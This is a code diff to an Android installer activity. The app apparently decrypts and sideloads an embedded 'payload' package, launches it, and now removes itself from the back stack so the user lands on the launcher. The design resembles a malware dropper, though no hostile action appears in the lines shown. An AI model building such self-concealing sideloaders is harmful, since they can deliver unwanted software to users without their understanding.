@@ -63,11 +63,13 @@ public class MainActivity extends Activity {
         btn    = findViewById(R.id.btnInstall);
         btn.setOnClickListener(v -> onInstallClicked());
 
-        // If the payload is already installed, skip everything and launch.
+        // If the payload is already installed, skip everything: launch
+        // and finish — no decryption, no install dialog, no UI flicker.
         if (isPayloadInstalled()) {
             status.setText("App installed, kindly wait for it to launch…");
             btn.setEnabled(false);
-            launchPayload();
+            launchPayloadAndExit();
+            return;
         }
     }
 
@@ -75,13 +77,13 @@ public class MainActivity extends Activity {
     protected void onResume() {
         super.onResume();
 
-        // Already installed? Just launch and bail.
+        // Already installed? Just launch and exit — no further activities.
         if (isPayloadInstalled()) {
             pendingConfirmIntent = null;
             awaitingUnknownSourcesGrant = false;
             status.setText("App installed, kindly wait for it to launch…");
             btn.setEnabled(false);
-            launchPayload();
+            launchPayloadAndExit();
             return;
         }
 
@@ -115,7 +117,7 @@ public class MainActivity extends Activity {
         if (isPayloadInstalled()) {
             status.setText("App installed, kindly wait for it to launch…");
             btn.setEnabled(false);
-            launchPayload();
+            launchPayloadAndExit();
             return;
         }
         startInstall();
@@ -180,10 +182,45 @@ public class MainActivity extends Activity {
         }
     }
 
+    // Resolve a launch intent for the payload package. Tries the standard
+    // PackageManager API first; on Android 11+ even with a <queries> entry
+    // a freshly installed package can briefly fail this lookup, so we fall
+    // back to manually resolving its MAIN/LAUNCHER activity.
+    private Intent resolvePayloadLaunchIntent(String pkg) {
+        PackageManager pm = getPackageManager();
+        Intent launch = pm.getLaunchIntentForPackage(pkg);
+        if (launch != null) return launch;
+        // Fallback: query MAIN/LAUNCHER activities of the package directly.
+        Intent probe = new Intent(Intent.ACTION_MAIN);
+        probe.addCategory(Intent.CATEGORY_LAUNCHER);
+        probe.setPackage(pkg);
+        java.util.List<android.content.pm.ResolveInfo> ris =
+                pm.queryIntentActivities(probe, 0);
+        if (ris != null && !ris.isEmpty()) {
+            android.content.pm.ActivityInfo ai = ris.get(0).activityInfo;
+            Intent direct = new Intent(Intent.ACTION_MAIN);
+            direct.addCategory(Intent.CATEGORY_LAUNCHER);
+            direct.setClassName(ai.packageName, ai.name);
+            return direct;
+        }
+        return null;
+    }
+
     // Poll until the freshly-installed payload package is queryable, then
     // launch it. Some devices take a beat after STATUS_SUCCESS before
     // getLaunchIntentForPackage returns non-null.
     private void launchPayload() {
+        launchPayloadInternal(false);
+    }
+
+    // Same as launchPayload() but finishes the installer activity right after
+    // a successful launch — used when the app is already installed (no need
+    // to keep the installer in the back stack).
+    private void launchPayloadAndExit() {
+        launchPayloadInternal(true);
+    }
+
+    private void launchPayloadInternal(boolean exitAfter) {
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg == null || pkg.isEmpty()) {
             status.setText("Installed (no payload package configured to launch).");
@@ -192,12 +229,18 @@ public class MainActivity extends Activity {
         final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
         ui.post(new Runnable() {
             @Override public void run() {
-                Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
+                Intent launch = resolvePayloadLaunchIntent(pkg);
                 if (launch != null) {
-                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                                  | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                     try {
                         startActivity(launch);
                         status.setText("Launched " + pkg);
+                        if (exitAfter) {
+                            // Drop ourselves from the back stack so the user
+                            // returns straight to the launcher, not us.
+                            ui.postDelayed(() -> finishAndRemoveTask(), 150);
+                        }
                     } catch (Exception e) {
                         status.setText("Launch failed: " + e.getMessage());
                     }
@@ -220,7 +263,7 @@ public class MainActivity extends Activity {
                 runOnUiThread(() -> {
                     status.setText("App installed, kindly wait for it to launch…");
                     btn.setEnabled(false);
-                    launchPayload();
+                    launchPayloadAndExit();
                 });
                 return;
             }
